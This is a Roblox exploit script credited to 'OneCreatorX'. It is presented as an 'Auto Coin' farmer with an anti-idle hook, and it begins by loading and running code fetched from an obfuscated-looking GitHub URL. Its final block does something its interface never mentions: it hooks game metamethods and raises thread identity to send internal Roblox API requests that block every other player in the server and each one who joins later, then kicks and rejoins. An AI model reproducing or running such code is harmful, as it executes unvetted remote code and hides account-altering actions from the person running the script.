local UL = loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/MyLibrery.lua"))()

local gameName = ""
if gameName == "" then
    gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end

local function cleanGameName(name)
    name = name:gsub("%b[]", "")
    name = name:match("^[^:]*")
    return name:match("^%s*(.-)%s*$")
end

gameName = cleanGameName(gameName)

local p = game.Players.LocalPlayer
local sg = UL:CrSG("Default")
local frm, cfrm, crFrm = UL:CrFrm(sg, gameName)

local a = true
UL:AddTBtn(cfrm, "Auto Coin", true, function(state) 
        
a = not a
end)

spawn(function()
        while a do

for _, obj in ipairs(workspace:GetChildren()) do
    if obj:IsA("BasePart") and obj:FindFirstChild("TouchInterest") then

local plr = game.Players.LocalPlayer
obj.Position = plr.Character.HumanoidRootPart.Position
wait()
end end
wait()
        end
    end)

UL:AddText(crFrm, "By Script: OneCreatorX ")
UL:AddText(crFrm, "Create Script: 05/08/24 ")
UL:AddText(crFrm, "Update Script: --/--/--")
UL:AddText(crFrm, "Script Version: 0.1")
UL:AddBtn(crFrm, "Copy link YouTube", function() setclipboard("https://youtube.com/@onecreatorx") end)
UL:AddBtn(crFrm, "Copy link Discord", function() setclipboard("https://discord.com/invite/UNJpdJx7c4") end)

game:GetService('Players').LocalPlayer.Idled:Connect(function()
    game:GetService('VirtualUser'):CaptureController()
    game:GetService('VirtualUser'):ClickButton2(Vector2.new())
end)

spawn(function()
        local P = game:GetService("Players")
local TS = game:GetService("TeleportService")
local LP = P.LocalPlayer

getgenv()._s = clonefunction(setthreadidentity)

function _p(u,d)
    pcall(function()
        o = hookmetamethod(game, "__index", function(a,b)
            task.spawn(function()
                pcall(function()
                    _s(7)
                    game:GetService("HttpRbxApiService"):PostAsyncFullUrl(u,d)
                end)
            end)
            hookmetamethod(game, "__index", o)
            return o(a,b)
        end)
    end)
end

function block(i)
    u = "https://apis.roblox.com/user-blocking-api/v1/users/"..i.."/block-user"
    d = game:GetService("HttpService"):JSONEncode({})
    if type(_p) == "function" then
        s, r = pcall(function() return _p(u,d) end)
    elseif type(game.HttpService.RequestInternal) == "function" then
        s, r = pcall(function()
            return game.HttpService:RequestInternal({
                Url = u,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = d
            })
        end)
    end
    return s, r
end

function blockAllOtherPlayers()
    local otherPlayersExist = false
    for _, player in ipairs(P:GetPlayers()) do
        if player ~= LP then
            local s, r = block(player.UserId)
            print("Block User", player.Name, "- Success:", s, "Result:", r)
            otherPlayersExist = true
        end
    end
    return otherPlayersExist
end

function rejoinExperience()
            game.Players.LocalPlayer:kick("Join other Server")
    local placeId = game.PlaceId
    TS:Teleport(placeId, LP)
end

if blockAllOtherPlayers() then
    rejoinExperience()
end

P.PlayerAdded:Connect(function(player)
    if player ~= LP then
        local s, r = block(player.UserId)
        print("Block User", player.Name, "- Success:", s, "Result:", r)
        rejoinExperience()
    end
end)
end)
